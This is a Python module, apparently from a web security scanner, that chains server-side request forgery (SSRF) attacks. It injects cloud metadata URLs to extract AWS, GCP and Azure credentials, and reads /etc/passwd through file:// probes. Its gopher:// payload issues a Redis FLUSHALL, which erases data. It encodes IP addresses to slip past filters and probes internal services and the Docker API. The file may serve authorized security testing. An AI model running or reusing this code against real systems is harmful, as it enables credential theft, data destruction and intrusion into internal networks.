"""
websecure.scanners.ssrf
------------------------
SSRF (Server-Side Request Forgery) tam exploit zinciri.

Adim 7 - Siniflar:
  SSRFScanner(BaseScanner)       -- orchestrator
  SSRFCloudMetadataChain         -- AWS/GCP/Azure/Alibaba metadata + credential extract
  SSRFProtocolExpander           -- gopher://, dict://, ftp://, ldap://, file://
  SSRFLateralMovementProber      -- internal subnet scan (10.x, 172.16.x, 192.168.x)
  SSRFFilterBypassProber         -- IP obfuscation (decimal, hex, octal, IPv6)
"""
from __future__ import annotations

import logging
import random
import re
import string
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
_OOB_HOST = "ssrf-wsp.invalid"

_URL_PARAMS = [
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "return", "return_url", "next",
    "target", "link", "ref", "reference", "page", "host",
    "webhook", "callback", "fetch", "load", "proxy", "remote",
    "file", "document", "resource", "endpoint", "service",
]

# Cloud metadata endpoints
_AWS_META   = "http://169.254.169.254"
_GCP_META   = "http://metadata.google.internal"
_AZURE_META = "http://169.254.169.254/metadata/instance?api-version=2021-01-01"
_ALI_META   = "http://100.100.100.200"

_CLOUD_TARGETS: List[Dict] = [
    {"name": "AWS IMDSv1 credentials",
     "url": f"{_AWS_META}/latest/meta-data/iam/security-credentials/",
     "cloud": "AWS",
     "detect": re.compile(r"iam|role|ec2", re.I)},
    {"name": "AWS IMDSv1 instance identity",
     "url": f"{_AWS_META}/latest/dynamic/instance-identity/document",
     "cloud": "AWS",
     "detect": re.compile(r"accountId|region|imageId", re.I)},
    {"name": "GCP metadata token",
     "url": f"{_GCP_META}/computeMetadata/v1/instance/service-accounts/default/token",
     "cloud": "GCP",
     "headers": {"Metadata-Flavor": "Google"},
     "detect": re.compile(r"access_token|token_type", re.I)},
    {"name": "GCP metadata project",
     "url": f"{_GCP_META}/computeMetadata/v1/project/project-id",
     "cloud": "GCP",
     "headers": {"Metadata-Flavor": "Google"},
     "detect": re.compile(r"[\w\-]{3,}", re.I)},
    {"name": "Azure IMDS",
     "url": _AZURE_META,
     "cloud": "Azure",
     "headers": {"Metadata": "true"},
     "detect": re.compile(r"subscriptionId|resourceGroupName|vmId", re.I)},
    {"name": "Alibaba Cloud metadata",
     "url": f"{_ALI_META}/latest/meta-data/",
     "cloud": "Alibaba",
     "detect": re.compile(r"instance|meta", re.I)},
    {"name": "AWS IMDSv2 token request",
     "url": f"{_AWS_META}/latest/api/token",
     "cloud": "AWS",
     "detect": re.compile(r"[A-Za-z0-9+/=]{20,}", re.I)},
]

# Internal subnet ranges for lateral movement
_INTERNAL_TARGETS = [
    "http://127.0.0.1",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://127.0.0.1:9200",   # Elasticsearch
    "http://127.0.0.1:6379",   # Redis
    "http://127.0.0.1:5432",   # PostgreSQL
    "http://127.0.0.1:3306",   # MySQL
    "http://127.0.0.1:27017",  # MongoDB
    "http://127.0.0.1:2181",   # Zookeeper
    "http://127.0.0.1:4848",   # GlassFish admin
    "http://127.0.0.1:8161",   # ActiveMQ
    "http://10.0.0.1",
    "http://10.0.0.1:8080",
    "http://192.168.1.1",
    "http://172.17.0.1",       # Docker bridge
    "http://172.17.0.1:2375",  # Docker API (unauth)
]

# IP obfuscation variants for filter bypass
_IP_OBFUSCATIONS: Dict[str, List[str]] = {
    "localhost": [
        "127.0.0.1", "2130706433",     # decimal
        "0x7f000001",                   # hex
        "0177.0.0.1",                  # octal
        "127.0.0.0x01",               # mixed
        "[::]",                        # IPv6 any
        "[::1]",                       # IPv6 loopback
        "localhost.",                  # trailing dot
        "LOCALHOST",                   # uppercase
        "0:0:0:0:0:ffff:7f00:0001",   # IPv6 mapped
        "localtest.me",               # public DNS -> 127.0.0.1
    ],
    "169.254.169.254": [
        "2852039166",                  # decimal
        "0xa9fea9fe",                  # hex
        "0251.0376.0251.0376",        # octal
        "169.254.169.254.",           # trailing dot
        "[::ffff:a9fe:a9fe]",         # IPv6 mapped
        "169.254.169.254%2F",         # URL encoded slash
    ],
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _canary() -> str:
    return "wsp" + "".join(random.choices(string.digits, k=6))


def _inject_url_param(base_url: str, inject_value: str) -> List[str]:
    parsed   = urllib.parse.urlparse(base_url)
    qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    results  = []
    for k, v in qs_pairs:
        if k.lower() in _URL_PARAMS:
            new_pairs = [(pk, inject_value if pk == k else pv) for pk, pv in qs_pairs]
            results.append(urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs))))
    if not results:
        # Inject common params if none found
        sep = "&" if parsed.query else ""
        for param in _URL_PARAMS[:4]:
            extra = parsed.query + sep + f"{param}={urllib.parse.quote(inject_value, safe=':/')}"
            results.append(urllib.parse.urlunparse(parsed._replace(query=extra)))
            sep = "&"
    return results


def _ssrf_detected_in_response(resp, indicator: str) -> bool:
    body = getattr(resp, "text", "")[:3000]
    return indicator in body or bool(re.search(re.escape(indicator)[:30], body, re.I))


# ===========================================================================
# 1. SSRFCloudMetadataChain
# ===========================================================================
class SSRFCloudMetadataChain(BaseScanner):
    """
    SSRF -> Cloud Metadata -> Credential Extraction zinciri.
    AWS IMDSv1/v2, GCP, Azure, Alibaba Cloud destekler.
    """
    name = "ssrf_cloud_metadata"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for meta in _CLOUD_TARGETS:
            for test_url in _inject_url_param(target, meta["url"]):
                finding = self._probe(test_url, meta)
                if finding:
                    results.append(finding)
                    self.report_finding(**finding)
                    break
        return results

    def _probe(self, test_url: str, meta: Dict) -> Optional[Dict]:
        extra_hdrs = meta.get("headers", {})
        try:
            resp = self.session.get(test_url, headers=extra_hdrs, timeout=10, allow_redirects=True)
            body = getattr(resp, "text", "")[:3000]
            if resp.status_code == 200 and meta["detect"].search(body):
                # For AWS creds: try to fetch the role-specific creds
                credential_data = None
                if meta["cloud"] == "AWS" and "security-credentials" in meta["url"]:
                    role_match = re.search(r"([A-Za-z0-9_\-]+)", body)
                    if role_match:
                        role_name = role_match.group(1)
                        cred_url  = meta["url"].rstrip("/") + "/" + role_name
                        cred_injection = _inject_url_param(test_url.split("?")[0], cred_url)
                        if cred_injection:
                            cred_resp = self.session.get(cred_injection[0], timeout=8)
                            cred_body = getattr(cred_resp, "text", "")[:1000]
                            if "AccessKeyId" in cred_body or "SecretAccessKey" in cred_body:
                                credential_data = {"role": role_name, "cred_body_snippet": cred_body[:300]}
                return {
                    "vuln_type": f"SSRF -> Cloud Metadata ({meta['cloud']})",
                    "url": test_url, "severity": "Critical",
                    "description": (
                        f"SSRF successful — {meta['name']} accessible. "
                        f"Attacker can read {meta['cloud']} instance metadata and potentially IAM credentials."
                    ),
                    "evidence": {
                        "cloud": meta["cloud"], "metadata_url": meta["url"],
                        "status": resp.status_code, "body_snippet": body[:300],
                        "credentials_extracted": credential_data,
                    },
                }
        except Exception as exc:
            logger.debug("[SSRFCloud] %s: %s", meta["name"], exc)
        return None


# ===========================================================================
# 2. SSRFProtocolExpander
# ===========================================================================
class SSRFProtocolExpander(BaseScanner):
    """
    SSRF protokol genisletmesi:
    gopher://, dict://, ftp://, ldap://, file://, sftp://, tftp://
    """
    name = "ssrf_protocol"

    _PROTOCOL_PROBES: List[Tuple[str, str, re.Pattern]] = [
        ("file:///etc/passwd",     "file://",   re.compile(r"root:.*:0:0:", re.I)),
        ("file:///windows/win.ini","file://",   re.compile(r"\[fonts\]|bit|for 16", re.I)),
        ("dict://127.0.0.1:6379/info", "dict://", re.compile(r"redis_version|OS:", re.I)),
        ("gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a", "gopher://",
         re.compile(r"\+OK|PONG", re.I)),
        ("ftp://127.0.0.1:21/", "ftp://", re.compile(r"220|230|ftp", re.I)),
        ("ldap://127.0.0.1:389/", "ldap://", re.compile(r"objectClass|dc=", re.I)),
        ("sftp://127.0.0.1:22/", "sftp://", re.compile(r"ssh-|protocol|banner", re.I)),
        ("http://127.0.0.1:9200/_cat/indices", "http-elasticsearch",
         re.compile(r"health|green|yellow|index", re.I)),
        ("http://127.0.0.1:2375/v1.24/containers/json", "http-docker-api",
         re.compile(r"Id.*Image|Names.*Status|Created", re.I)),
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for probe_url, proto_name, detect_re in self._PROTOCOL_PROBES:
            for test_url in _inject_url_param(target, probe_url)[:2]:
                try:
                    resp = self.session.get(test_url, timeout=10, allow_redirects=True)
                    body = getattr(resp, "text", "")[:2000]
                    if resp.status_code == 200 and detect_re.search(body):
                        finding = {
                            "vuln_type": f"SSRF Protocol Expansion — {proto_name}",
                            "url": test_url, "severity": "Critical",
                            "description": (
                                f"SSRF via {proto_name} protocol. "
                                f"Server fetched internal resource: {probe_url[:60]}. "
                                "Attacker can probe internal services or read local files."
                            ),
                            "evidence": {
                                "protocol": proto_name, "probe_url": probe_url,
                                "status": resp.status_code, "body_snippet": body[:300],
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        break
                except Exception as exc:
                    logger.debug("[SSRFProto] %s: %s", proto_name, exc)
        return results


# ===========================================================================
# 3. SSRFFilterBypassProber
# ===========================================================================
class SSRFFilterBypassProber(BaseScanner):
    """
    SSRF filter bypass teknikleri:
    - IP decimal/hex/octal/mixed encoding
    - IPv6 mapped addresses
    - Trailing dot bypass
    - URL encode tricks
    - Redirect chain bypass
    """
    name = "ssrf_filter_bypass"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for canonical_ip, variants in _IP_OBFUSCATIONS.items():
            for variant in variants:
                # Try metadata-style path with obfuscated IP
                if canonical_ip == "169.254.169.254":
                    probe = f"http://{variant}/latest/meta-data/"
                else:
                    probe = f"http://{variant}/"
                for test_url in _inject_url_param(target, probe)[:2]:
                    try:
                        resp = self.session.get(test_url, timeout=8, allow_redirects=True)
                        body = getattr(resp, "text", "")[:2000]
                        if resp.status_code == 200 and len(body) > 20:
                            finding = {
                                "vuln_type": "SSRF Filter Bypass via IP Obfuscation",
                                "url": test_url, "severity": "Critical",
                                "description": (
                                    f"SSRF filter bypassed using IP obfuscation variant {variant!r} "
                                    f"(canonical: {canonical_ip}). "
                                    "Allowlist/denylist can be evaded."
                                ),
                                "evidence": {
                                    "canonical_ip": canonical_ip, "obfuscated": variant,
                                    "probe": probe, "status": resp.status_code,
                                    "body_snippet": body[:200],
                                },
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            break
                    except Exception as exc:
                        logger.debug("[SSRFBypass] %s: %s", variant, exc)
                if results:
                    return results
        return results


# ===========================================================================
# 4. SSRFLateralMovementProber
# ===========================================================================
class SSRFLateralMovementProber(BaseScanner):
    """
    SSRF -> Internal network scanning + service fingerprinting.
    Docker API, Elasticsearch, Redis, MySQL, MongoDB probe.
    """
    name = "ssrf_lateral"

    _SERVICE_SIGNATURES: Dict[str, re.Pattern] = {
        "Redis":           re.compile(r"PONG|redis_version|\+OK", re.I),
        "Elasticsearch":   re.compile(r"cluster_name|tagline|version.*number", re.I),
        "Docker API":      re.compile(r"ApiVersion|OSType|ServerVersion", re.I),
        "MongoDB":         re.compile(r"ismaster|maxBsonObjectSize|ok.*1", re.I),
        "Kubernetes API":  re.compile(r"kind.*Status|apiVersion|Unauthorized", re.I),
        "Consul":          re.compile(r"Config|Datacenter|NodeName", re.I),
        "Prometheus":      re.compile(r"go_gc_duration|# TYPE|# HELP", re.I),
        "Grafana":         re.compile(r"Grafana|grafana_info|dashboards", re.I),
    }

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for internal_url in _INTERNAL_TARGETS:
            for test_url in _inject_url_param(target, internal_url)[:1]:
                try:
                    resp = self.session.get(test_url, timeout=8, allow_redirects=True)
                    body = getattr(resp, "text", "")[:3000]
                    if resp.status_code in (200, 401, 403):
                        service = self._identify_service(body)
                        finding = {
                            "vuln_type": "SSRF -> Internal Service Discovery",
                            "url": test_url, "severity": "High",
                            "description": (
                                f"SSRF reached internal target {internal_url}. "
                                f"Service identified: {service or 'Unknown'}. "
                                "Lateral movement to internal network confirmed."
                            ),
                            "evidence": {
                                "internal_target": internal_url, "service": service,
                                "status": resp.status_code, "body_snippet": body[:300],
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                except Exception as exc:
                    logger.debug("[SSRFLateral] %s: %s", internal_url, exc)
        return results

    def _identify_service(self, body: str) -> Optional[str]:
        for service, pattern in self._SERVICE_SIGNATURES.items():
            if pattern.search(body):
                return service
        return None


# ===========================================================================
# SSRFScanner — Orchestrator
# ===========================================================================
class SSRFScanner(BaseScanner):
    """
    Adim 7 SSRF orchestrator:
    CloudMetadataChain -> ProtocolExpander -> FilterBypassProber -> LateralMovementProber
    """
    name = "ssrf"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        chains = [
            SSRFCloudMetadataChain(session=self.session, results=self.results),
            SSRFProtocolExpander(session=self.session, results=self.results),
            SSRFFilterBypassProber(session=self.session, results=self.results),
            SSRFLateralMovementProber(session=self.session, results=self.results),
        ]
        for chain in chains:
            try:
                chain.target = target
                res = chain.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                logger.warning("[SSRFScanner] %s failed: %s", chain.name, exc)
        return all_results


def run(url: str, session=None, debug: bool = False, **kwargs) -> List[Dict]:
    """Module-level adapter."""
    scanner = SSRFScanner(session=session, debug=debug)
    return scanner.run(url, **kwargs)
